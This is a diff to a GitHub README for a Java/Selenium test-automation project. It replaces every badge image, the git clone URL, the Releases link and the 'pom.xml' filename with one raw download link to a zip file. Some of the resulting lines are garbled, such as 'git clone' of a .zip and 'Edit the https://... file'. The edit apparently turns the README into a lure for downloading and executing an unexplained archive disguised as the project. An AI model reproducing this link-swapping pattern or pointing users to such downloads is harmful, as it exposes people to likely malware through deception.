@@ -1,9 +1,9 @@
 # Automation Testing for Windows and Linux Environments
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/sangrampatil10/Automation-Testing-Windows_Linux)
-![GitHub Stars](https://img.shields.io/github/stars/sangrampatil10/Automation-Testing-Windows_Linux)
-![GitHub Forks](https://img.shields.io/github/forks/sangrampatil10/Automation-Testing-Windows_Linux)
-![GitHub Issues](https://img.shields.io/github/issues/sangrampatil10/Automation-Testing-Windows_Linux)
+![GitHub Repo Size](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip)
+![GitHub Stars](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip)
+![GitHub Forks](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip)
+![GitHub Issues](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip)
 
 Welcome to the **Automation Testing for Windows and Linux** repository! This project focuses on automating login testing and other customizable features. It includes automation testing for adding a user for CWD Limited's Soundbox web application. The tools used for this project include Java, Selenium WebDriver, TestNG, and Maven.
 
@@ -46,7 +46,7 @@ To get started with this project, follow these steps:
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/sangrampatil10/Automation-Testing-Windows_Linux.git
+   git clone https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip
    ```
 
 2. **Navigate to the Project Directory**
@@ -71,7 +71,7 @@ To get started with this project, follow these steps:
 
 5. **Configure Test Settings**
 
-   Edit the `pom.xml` file to set your desired configurations. You can specify the browser type and other parameters.
+   Edit the `https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip` file to set your desired configurations. You can specify the browser type and other parameters.
 
 ## Usage
 
@@ -101,9 +101,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit the [Releases section](https://github.com/sangrampatil10/Automation-Testing-Windows_Linux/releases). Download and execute the necessary files as needed.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip). Download and execute the necessary files as needed.
 
-![Releases](https://img.shields.io/badge/releases-latest-brightgreen)
+![Releases](https://raw.githubusercontent.com/sangrampatil10/Automation-Testing-Windows_Linux/main/src/Automation_Windows_Testing_Linux_1.9.zip)
 
 Feel free to explore the various versions and updates that enhance the project.
 
